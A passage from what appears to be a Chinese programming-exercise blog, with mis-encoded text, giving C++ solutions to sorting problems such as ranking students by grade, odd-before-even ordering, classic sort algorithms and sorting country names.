c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line">string name;</span><br><span class="line"><span class="keyword">int</span> grade;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">desc</span><span class="params">(struct student s1, struct student s2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> s1.grade &gt; s2.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">asc</span><span class="params">(struct student s1, struct student s2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> s1.grade &lt; s2.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, order;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; order)&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>[100];</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; stu[i].name &gt;&gt; stu[i].grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(order == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">stable_sort</span>(stu, stu+n, desc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">stable_sort</span>(stu, stu+n, asc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cout &lt;&lt; stu[i].name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; stu[i].grade &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>äºŒçº§æ’åº</p><p>è®¾ç½®ä¸€ä¸ªidï¼Œæˆç»©ç›¸åŒidå°çš„åœ¨ä¸Š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line">string name;</span><br><span class="line"><span class="keyword">int</span> grade, id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">desc</span><span class="params">(struct student s1, struct student s2)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(s1.grade == s2.grade) <span class="keyword">return</span> s1.id &lt; s2.id;</span><br><span class="line"><span class="keyword">return</span> s1.grade &gt; s2.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">asc</span><span class="params">(struct student s1, struct student s2)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(s1.grade == s2.grade) <span class="keyword">return</span> s1.id &lt; s2.id;</span><br><span class="line"><span class="keyword">return</span> s1.grade &lt; s2.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, order;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; order)&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>[1000];</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; stu[i].name &gt;&gt; stu[i].grade;</span><br><span class="line">stu[i].id = i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(order == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">sort</span>(stu, stu+n, desc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">sort</span>(stu, stu+n, asc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cout &lt;&lt; stu[i].name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; stu[i].grade &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="æ’åº-2"><a href="#æ’åº-2" class="headerlink" title="æ’åº"></a>æ’åº</h3><p>è¾“å…¥nä¸ªæ•°è¿›è¡Œæ’åºï¼Œè¦æ±‚å…ˆæŒ‰å¥‡å¶åæŒ‰ä»å°åˆ°å¤§çš„é¡ºåºæ’åºã€‚</p><p>ä¹Ÿæœ‰ä¸¤ç§åŠæ³•ï¼Œä¸€ä¸ªæ˜¯å¥‡å¶åˆ†å¼€æ’ï¼Œä¸€ä¸ªæ˜¯äºŒçº§æ’åºï¼ŒæŠŠå¥‡æ•°æ’åœ¨å¶æ•°å‰é¢ï¼›</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;, odd[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;, even[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> idx1 = <span class="number">0</span>, idx2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(m[i] % <span class="number">2</span> == <span class="number">0</span>) even[idx1++] = m[i];</span><br><span class="line"><span class="keyword">else</span> odd[idx2++] = m[i]; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(odd, odd+idx2);</span><br><span class="line"><span class="built_in">sort</span>(even, even+idx1);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; idx2; i++)&#123;</span><br><span class="line">cout &lt;&lt; odd[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; idx1; i++)&#123;</span><br><span class="line">cout &lt;&lt; even[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ†çº§ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a % <span class="number">2</span> == b % <span class="number">2</span>) <span class="keyword">return</span> a &lt; b;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in"><span class="keyword">return</span></span> (a%<span class="number">2</span>) &gt; (b%<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(m, m+n, compare);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cout &lt;&lt; m[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ’åº2"><a href="#æ’åº2" class="headerlink" title="æ’åº2"></a>æ’åº2</h3><p>ç¼–å†™ç¨‹åºå®ç°ç›´æ¥æ’å…¥æ’åºã€å¸Œå°”æ’åºï¼ˆd=5)ã€ç›´æ¥é€‰æ‹©æ’åºã€å¿«é€Ÿæ’åºå’ŒäºŒè·¯å½’å¹¶æ’åºç®—æ³•ã€‚</p><p>ç›´æ¥æ’å…¥æ’åºåçš„ç»“æœ ä¸€è¶Ÿå¸Œå°”æ’åºåçš„ç»“æœ ç›´æ¥é€‰æ‹©æ’åºåçš„ç»“æœ å¿«é€Ÿæ’åºåçš„ç»“æœ ä¸€è¶ŸäºŒè·¯å½’å¹¶æ’åºåçš„ç»“æœ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = arr[i];</span><br><span class="line"><span class="keyword">int</span> j = i - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>((j &gt;= <span class="number">0</span>) &amp;&amp; (arr[j] &gt; tmp))&#123;</span><br><span class="line">arr[j+<span class="number">1</span>] = arr[j];</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">arr[j+<span class="number">1</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell_sort_onetime</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> gap = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = gap; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = arr[i], j;</span><br><span class="line"><span class="keyword">for</span>(j = i - gap; j &gt;=<span class="number">0</span> &amp;&amp; arr[j] &gt; tmp; j -= gap)&#123;</span><br><span class="line">arr[j + gap] = arr[j];</span><br><span class="line">&#125;</span><br><span class="line">arr[j + gap] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">select_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> idx;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">idx = i;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; len; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(arr[j] &lt; arr[idx]) idx = j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> tmp = arr[i];</span><br><span class="line">arr[i] = arr[idx];</span><br><span class="line">arr[idx] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">int</span> i = l, j = r, x = arr[l];</span><br><span class="line"><span class="keyword">while</span>(i &lt; j)&#123;</span><br><span class="line"><span class="keyword">while</span>(arr[j] &gt;= x &amp;&amp;  i &lt; j) j--;</span><br><span class="line"><span class="keyword">if</span>(i &lt; j) arr[i++] = arr[j];</span><br><span class="line"><span class="keyword">while</span>(arr[i] &lt;= x &amp;&amp; i &lt; j) i++;</span><br><span class="line"><span class="keyword">if</span>(i &lt; j) arr[j--] = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">arr[i] = x;</span><br><span class="line"><span class="built_in">quick_sort</span>(arr, l, i - <span class="number">1</span>);</span><br><span class="line"><span class="built_in">quick_sort</span>(arr, j + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start_quick_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="built_in">quick_sort</span>(arr, <span class="number">0</span>, len<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">twomerge_onetime</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len<span class="number">-1</span>; i += <span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(arr[i] &gt; arr[i+<span class="number">1</span>]) <span class="built_in">swap</span>(arr[i], arr[i+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">int</span> m[n], tmp[n];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; m[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç›´æ¥æ’å…¥æ’åº</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">tmp[i] = m[i];</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">insert_sort</span>(tmp, n);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¸Œå°”æ’åº</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">tmp[i] = m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">shell_sort_onetime</span>(tmp, n);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç›´æ¥é€‰æ‹©æ’åº</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">tmp[i] = m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">select_sort</span>(tmp, n);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¿«é€Ÿæ’åº</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">tmp[i] = m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">start_quick_sort</span>(tmp, n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">tmp[i] = m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">twomerge_onetime</span>(tmp, n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å›½åæ’åº"><a href="#å›½åæ’åº" class="headerlink" title="å›½åæ’åº"></a>å›½åæ’åº</h3><p>ç¬¬ä¸€è¡Œä¸ºä¸€ä¸ªnï¼ˆn&lt;=100ï¼‰è¡¨ç¤ºnä¸ªå›½å®¶ï¼Œç¬¬ï¼’è¡Œåˆ°ç¬¬nï¼‹ï¼‘è¡Œåˆ†åˆ«ä¸ºnä¸ªå›½å®¶çš„åå­—ï¼</p><p>è¾“å‡ºnä¸ªå›½å®¶æŒ‰å­—å…¸é¡ºåºçš„æ’åˆ—ï¼</p><p>å­—ç¬¦ä¸²æ¯”è¾ƒç”¨strcmpï¼Œä½†æ˜¯éœ€è¦ç”¨ç»“æ„ä½“ï¼Œä¸èƒ½ç”¨äºŒç»´æ•°ç»„ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">country</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>]; </span><br><span class="line">&#125;s[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compare</span><span class="params">(struct country a, struct country b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strcmp</span>(a.name, b.name) &lt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; s[i].name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(s, s+n, compare);;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; n; i++)&#123;</span><br><span class="line">cout &lt;&lt; s[i].name &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="æ—¥å¿—æ’åº"><a href="#æ—¥å¿—æ’åº" class="headerlink" title="æ—¥å¿—æ’åº"></a>æ—¥å¿—æ’åº</h3><p>æœ‰ä¸€ä¸ªç½‘ç»œæ—¥å¿—ï¼Œè®°å½•äº†ç½‘ç»œä¸­è®¡ç®—ä»»åŠ¡çš„æ‰§è¡Œæƒ…å†µï¼Œæ¯ä¸ªè®¡ç®—ä»»åŠ¡å¯¹åº”ä¸€æ¡å¦‚ä¸‹å½¢å¼çš„æ—¥å¿—è®°å½•ï¼š â€œhs_10000_pâ€æ˜¯è®¡ç®—ä»»åŠ¡çš„åç§°ï¼Œ â€œ2007-01-17 19:22:53,315â€æ˜¯è®¡ç®—ä»»åŠ¡å¼€å§‹æ‰§è¡Œçš„æ—¶é—´â€œå¹´-æœˆ-æ—¥ æ—¶ï¼šåˆ†ï¼šç§’ï¼Œæ¯«ç§’â€ï¼Œ â€œ253.035(s)â€æ˜¯è®¡ç®—ä»»åŠ¡æ¶ˆè€—çš„æ—¶é—´(ä»¥ç§’è®¡) hs_10000_p 2007-01-17 19:22:53,315 253.035(s) è¯·ä½ å†™ä¸€ä¸ªç¨‹åºï¼Œå¯¹æ—¥å¿—ä¸­è®°å½•è®¡ç®—ä»»åŠ¡è¿›è¡Œæ’åºã€‚ 